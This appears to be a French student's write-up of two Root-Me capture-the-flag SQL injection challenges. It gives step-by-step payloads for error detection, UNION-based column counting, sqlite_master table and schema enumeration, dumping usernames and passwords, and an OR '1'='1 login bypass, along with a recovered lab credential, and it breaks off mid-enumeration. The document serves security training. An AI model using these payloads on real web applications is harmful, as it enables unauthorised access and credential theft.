**RootMe**
# SQL injection - String

URL : http://challenge01.root-me.org/web-serveur/ch19

Etudiant | Date | Sujet
:---|:---|:---
Hamza Terir | 23/11/2022 | SQLi


### Erreur SQL
```
admin'
```

![Pasted image 20221123135349](https://user-images.githubusercontent.com/122984033/213180205-c2af302a-74df-4617-a038-892e857cdc4a.png)

### Point d'injection

Le point d'injection est dans la barre de recherche qui est accessible à cette url :

http://challenge01.root-me.org/web-serveur/ch19/


![Pasted image 20230118141543](https://user-images.githubusercontent.com/122984033/213181856-63ba1da1-f3f7-4250-8f57-11e4e1fb3a1f.png)

## Exploitation

### Requête True
```sql
' OR 1=1
```

### Nombre de colonnes (2)
```sql
' UNION SELECT null,null -- 
```

#### Informations

### Version
```sql
' UNION SELECT null,sqlite_version() -- 
```

**Database version** : SQLite3 (3.31.1)

![Pasted image 20221123142951](https://user-images.githubusercontent.com/122984033/213182251-f8688658-98f8-41ff-adef-d2c3e06f2f4e.png)

### Tables
```sql
' UNION SELECT null,name FROM sqlite_master WHERE type='table' -- 
```
![Pasted image 20221123142924](https://user-images.githubusercontent.com/122984033/213182410-affcd2ee-e013-4412-ae5f-8f2898b5c88e.png)

### Schema Tables
```sql
' UNION SELECT null,sql FROM sqlite_master WHERE type='table' -- 
```
![Pasted image 20221123143111](https://user-images.githubusercontent.com/122984033/213182667-6599c824-048b-408f-a0e1-fa306d465e06.png)

### Identifiants
```sql
' UNION SELECT null,null OR 1=1

' UNION SELECT username,password FROM users -- 
```

## Flag

![Pasted image 20221123145118](https://user-images.githubusercontent.com/122984033/213182786-d5d61278-33ad-4465-b3f2-1719f0c7c521.png)


# SQL injection - Authentication

URL : http://challenge01.root-me.org/web-serveur/ch19

## Reconnaissance
### Detection

```sql
admin
admin'
```

![Pasted image 20230118143012](https://user-images.githubusercontent.com/122984033/213186831-23504ec9-2705-4345-9044-0ae77b53aace.png)

Requête POST /web-serveur/ch9/
```javascript
login=admin&password=admin%27
```

![Pasted image 20230118143340](https://user-images.githubusercontent.com/122984033/213187295-70abea90-85fe-48b5-baa8-ef888b7085e2.png)

On obtient l'erreur SQL de lase base de données SQlite3 :

![Pasted image 20230118143526](https://user-images.githubusercontent.com/122984033/213187431-b7e42334-f087-405a-a1f4-d2f3df818305.png)

## Exploitation
### Requête true

Requête POST avec la charge utile dans le point d'injection qui correspond à la partie password dans le formulaire :
```sql
login=admin&password=admin' OR '1'='1
```

![Pasted image 20230118143728](https://user-images.githubusercontent.com/122984033/213187676-ad879ddd-e43f-44c8-90e8-9ea310198293.png)

On obtient un accès au compte user1 :

![Pasted image 20230118143835](https://user-images.githubusercontent.com/122984033/213187815-f1fdc674-08df-4376-a86e-a1cd3565457c.png)

Si on va se connecter à l'aide de :
```sql
admin
admin' OR '1'='1
```

On retrouve un mot de passe sous forme de html en clair :

![Pasted image 20230118145103](https://user-images.githubusercontent.com/122984033/213196271-9a34707d-034c-4099-8e03-15b39aec072d.png)


En changant le type de balise input par "text" nous pouvons retrouver le valeur du mot de passe en clair sur la partie html :

![Pasted image 20230118145305](https://user-images.githubusercontent.com/122984033/213196437-ccf79250-17d1-4560-92b6-ad848f0ceb93.png)

**Credentials**
```
user1:TYsgv75zgtq
```
On essaie de se connecter avec ces identifiants, rien ne se passe.

On continue d'essayer d'exploiter la faille SQL dans le formulaire avec ce compte cette fois-ci en injectant :
```sql
user1
TYsgv75zgtq' OR '1'='1
```

On détermine le nombre de colonnes en injectant le payload avec une requête POST :
```sql
login=user1&password=TYsgv75zgtq' UNION SELECT null  --
```

Erreur, il n'y a pas qu'une colonne.

![Pasted image 20230118151849](https://user-images.githubusercontent.com/122984033/213196745-3c7158c3-3b9d-4c47-9821-e9140e3c7a76.png)

On ajoute un autre null pour déterminer si il y a 2 colonnes :
```sql
login=user1&password=TYsgv75zgtq' UNION SELECT null,null --
```

Nous avons bien deux colonnes :

![Pasted image 20230118152054](https://user-images.githubusercontent.com/122984033/213196853-b5b1540f-8657-444a-bace-8d4e45875e15.png)











